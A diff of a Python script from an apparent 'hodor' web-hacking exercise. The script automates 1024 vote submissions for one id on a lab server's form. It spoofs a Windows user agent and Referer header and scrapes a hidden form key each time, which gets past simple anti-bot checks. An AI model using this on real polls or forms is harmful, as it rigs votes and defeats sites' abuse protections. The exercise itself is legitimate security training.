@@ -1,22 +1,23 @@
 #!/usr/bin/python3
 """
 hodor level 1
-Send 4096 votes to my school id with post request to url
-identify the user agent
+Send 1024 votes to my school id with post request to url
+user-agent must be a windows machine
 extract the hidden key/value w/regeix,
 though the hidden key may be hardcoded and able to be a constant
 """
 import requests
 import re
-
-agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) \
-Gecko/20100101 Firefox/76.0"
+agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
+(KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43"
+# agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) \
+# Gecko/20100101 Firefox/76.0"
 datadic = {'id': '1345', 'holdthedoor': 'submit'}
-target_url = "http://158.69.76.135/level1.php"
-num_votes = 4096
+target_url = "http://158.69.76.135/level2.php"
+num_votes = 1024
 reqs_made = 0
 fails = 0
-headers = {'User-Agent': agent}
+headers = {'User-Agent': agent, 'Referer': target_url}
 sess = requests.Session()
 sess.headers.update(headers)
 
@@ -27,8 +28,8 @@ while reqs_made < num_votes and fails < 100:
         if res.status_code is not 200:
             continue
         rxget = re.findall("value=\"([^\"]+)\"", res.text)
-#        print(rxget[0])
         datadic["key"] = rxget[0]
+#       print(datadic)
         res = sess.post(target_url, data=datadic)
         if res.status_code is 200:
             fails = 0
@@ -38,4 +39,4 @@ while reqs_made < num_votes and fails < 100:
         print(e)
         fails += 1
 
-print("end w/ {} votes passed from 4096".format(reqs_made))
+print("end w/ {} votes passed from 1024".format(reqs_made))
